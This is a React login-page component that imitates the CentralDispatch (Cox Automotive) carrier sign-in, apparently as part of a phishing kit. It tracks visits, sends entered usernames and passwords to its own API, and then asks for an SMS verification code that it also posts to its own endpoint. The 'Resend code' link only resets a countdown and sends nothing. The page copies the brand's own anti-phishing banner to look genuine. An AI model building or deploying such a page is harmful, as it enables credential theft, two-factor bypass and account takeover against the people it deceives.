import { useState, useEffect } from 'react'
import { Link } from 'react-router-dom'
import CentralDispatchLogo from '../components/CentralDispatchLogo'
import CarrierPortal from '../components/CarrierPortal'

const apiUrl = import.meta.env.VITE_API_URL ?? ''
const STORAGE_KEY = 'summit_carrier_session'
const RESEND_SECONDS = 285

function CentralDispatchHeader({ centered = false }) {
  if (centered) {
    return (
      <>
        <div className="cd-header cd-header-centered">
          <CentralDispatchLogo size={40} />
          <div className="cd-header-text">
            <span className="cd-brand-name">CentralDispatch</span>
            <span className="cd-brand-sub">by Cox Automotive</span>
          </div>
        </div>
        <hr className="cd-divider" />
      </>
    )
  }

  return (
    <>
      <div className="cd-header">
        <CentralDispatchLogo size={32} />
        <div className="cd-header-text">
          <span className="cd-brand-name">CentralDispatch</span>
          <span className="cd-brand-sub">by Cox Automotive</span>
        </div>
      </div>
      <hr className="cd-divider" />
    </>
  )
}

function InfoIcon() {
  return (
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
      <circle cx="12" cy="12" r="10" />
      <line x1="12" y1="16" x2="12" y2="11" />
      <line x1="12" y1="8" x2="12.01" y2="8" />
    </svg>
  )
}

function formatTimer(seconds) {
  const m = Math.floor(seconds / 60)
  const s = seconds % 60
  return `${m}:${String(s).padStart(2, '0')}`
}

function CarrierLoginPage() {
  const [session, setSession] = useState(() => {
    const saved = sessionStorage.getItem(STORAGE_KEY)
    return saved ? JSON.parse(saved) : null
  })
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [rememberUsername, setRememberUsername] = useState(false)
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(false)
  const [touched, setTouched] = useState({ username: false, password: false })

  useEffect(() => {
    fetch(`${apiUrl}/api/track/visit`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ page: 'carrier-login', referrer: document.referrer }),
    }).catch(() => {})
  }, [])

  const [stage, setStage] = useState(() => {
    if (import.meta.env.DEV && new URLSearchParams(window.location.search).get('stage') === 'verify') {
      return 'verify'
    }
    return 'credentials'
  }) // 'credentials' | 'verify'
  const [carrierId, setCarrierId] = useState(null)
  const [code, setCode] = useState('')
  const [resendSeconds, setResendSeconds] = useState(RESEND_SECONDS)

  useEffect(() => {
    if (stage !== 'verify') return
    setResendSeconds(RESEND_SECONDS)
    const timer = setInterval(() => {
      setResendSeconds((s) => (s > 0 ? s - 1 : 0))
    }, 1000)
    return () => clearInterval(timer)
  }, [stage])

  const handleCredentialsSubmit = async (e) => {
    e.preventDefault()
    setError('')

    if (!username) {
      setError('Please enter your username.')
      return
    }
    if (!password) {
      setError('Please enter your password.')
      return
    }

    setLoading(true)
    try {
      const res = await fetch(`${apiUrl}/api/carriers/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: username, password }),
      })

      const raw = await res.text()
      let data
      try {
        data = raw ? JSON.parse(raw) : {}
      } catch {
        throw new Error('Login API returned an invalid response. Check Netlify functions and environment variables.')
      }

      if (!res.ok) throw new Error(data.error || 'Login failed.')

      setCarrierId(data.carrierId ?? null)
      await new Promise((resolve) => setTimeout(resolve, 5000))
      setStage('verify')
    } catch (err) {
      setError(err.message)
    } finally {
      setLoading(false)
    }
  }

  const handleVerifySubmit = async (e) => {
    e.preventDefault()
    setError('')
    setLoading(true)
    try {
      const res = await fetch(`${apiUrl}/api/carriers/verify-2fa`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ carrierId, code }),
      })
      const data = await res.json()
      if (!res.ok) throw new Error(data.error || 'Verification failed.')

      sessionStorage.setItem(STORAGE_KEY, JSON.stringify(data))
      setSession(data)
    } catch (err) {
      setError(err.message)
    } finally {
      setLoading(false)
    }
  }

  const handleLogout = () => {
    sessionStorage.removeItem(STORAGE_KEY)
    setSession(null)
    setUsername('')
    setPassword('')
    setStage('credentials')
    setCode('')
  }

  return (
    <div className={`login-page${stage === 'verify' ? ' verify-page' : ''}`}>
      <div className="login-main">
        {session ? (
          <CarrierPortal session={session} onLogout={handleLogout} />
        ) : stage === 'credentials' ? (
          <div className="login-card cd-card">
            <CentralDispatchHeader />
            <h1 className="cd-title">Sign-In</h1>

            <div className="cd-banner">
              <InfoIcon />
              <p>
                Central Dispatch will never ask for your password via email or text. Always
                verify the sender and URL before signing in. Learn how to identify legitimate
                Central Dispatch communications&mdash;including verified domains, trusted URLs,
                and common phishing red flags:
                <br />
                <a href="https://www.centraldispatch.com/staysafe" target="_blank" rel="noreferrer">
                  centraldispatch.com/staysafe
                </a>
              </p>
            </div>

            <form onSubmit={handleCredentialsSubmit} noValidate className="cd-form">
              <div className="form-field">
                <label htmlFor="loginUsername">Username</label>
                <input
                  id="loginUsername"
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onBlur={() => setTouched((t) => ({ ...t, username: true }))}
                  className={touched.username && !username ? 'input-error' : ''}
                  autoFocus
                />
                {touched.username && !username && (
                  <span className="field-inline-error">Enter username</span>
                )}
              </div>

              <div className="form-field">
                <label htmlFor="loginPassword">Password</label>
                <div className="password-field">
                  <input
                    id="loginPassword"
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    onBlur={() => setTouched((t) => ({ ...t, password: true }))}
                    className={touched.password && !password ? 'input-error' : ''}
                  />
                  <button
                    type="button"
                    className="password-toggle"
                    onClick={() => setShowPassword((v) => !v)}
                    aria-label="Toggle password visibility"
                  >
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      {showPassword ? (
                        <>
                          <path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94" />
                          <path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19" />
                          <line x1="1" y1="1" x2="23" y2="23" />
                        </>
                      ) : (
                        <>
                          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                          <circle cx="12" cy="12" r="3" />
                        </>
                      )}
                    </svg>
                  </button>
                </div>
                {touched.password && !password && (
                  <span className="field-inline-error">Enter password</span>
                )}
              </div>

              <label className="cd-remember">
                <input
                  type="checkbox"
                  checked={rememberUsername}
                  onChange={(e) => setRememberUsername(e.target.checked)}
                />
                Remember my Username
              </label>

              {error && <span className="field-error">{error}</span>}

              <button type="submit" className="btn btn-block cd-btn" disabled={loading}>
                {loading ? 'Signing In...' : 'Sign In'}
              </button>
              {loading && (
                <p className="login-status-msg">Checking credentials and sending verification code...</p>
              )}
            </form>

            <div className="cd-forgot-row">
              <span>Forgot?</span>
              <div className="cd-forgot-links">
                <a href="#forgot-username">
                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2" />
                    <circle cx="12" cy="7" r="4" />
                  </svg>
                  Username
                </a>
                <a href="#forgot-password">
                  <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="3" y="11" width="18" height="11" rx="2" />
                    <path d="M7 11V7a5 5 0 0110 0v4" />
                  </svg>
                  Password
                </a>
              </div>
            </div>

            <div className="cd-member-divider">Not a member?</div>

            <Link to="/carrier-signup" className="btn cd-btn-outline btn-block">
              Create an Account
            </Link>
          </div>
        ) : (
          <div className="login-card cd-card verify-card">
            <CentralDispatchHeader />
            <h1 className="cd-verify-title">Verify Access</h1>

            <div className="cd-banner cd-verify-banner">
              <InfoIcon />
              <p>
                A code was sent to your number on file. It may take a few minutes.
                Please enter it once received.
              </p>
            </div>

            <div className="cd-resend-row cd-verify-resend">
              Didn't Receive Code?{' '}
              {resendSeconds > 0 ? (
                <span className="cd-resend-timer">
                  Resend in <strong>{formatTimer(resendSeconds)}</strong>
                </span>
              ) : (
                <a href="#resend" onClick={(e) => { e.preventDefault(); setResendSeconds(RESEND_SECONDS) }}>
                  Resend code
                </a>
              )}
            </div>

            <form onSubmit={handleVerifySubmit} className="cd-form cd-verify-form">
              <div className="form-field">
                <label htmlFor="verifyCode">Verification Code</label>
                <input
                  id="verifyCode"
                  type="text"
                  inputMode="numeric"
                  maxLength={6}
                  value={code}
                  onChange={(e) => setCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
                  className={error ? 'input-error' : ''}
                  autoFocus
                />
                {error && <span className="field-inline-error">{error}</span>}
              </div>

              <button type="submit" className="btn btn-block cd-btn cd-btn-verify" disabled={loading}>
                {loading ? 'Verifying...' : 'Submit'}
              </button>
            </form>
          </div>
        )}
      </div>
    </div>
  )
}

export default CarrierLoginPage
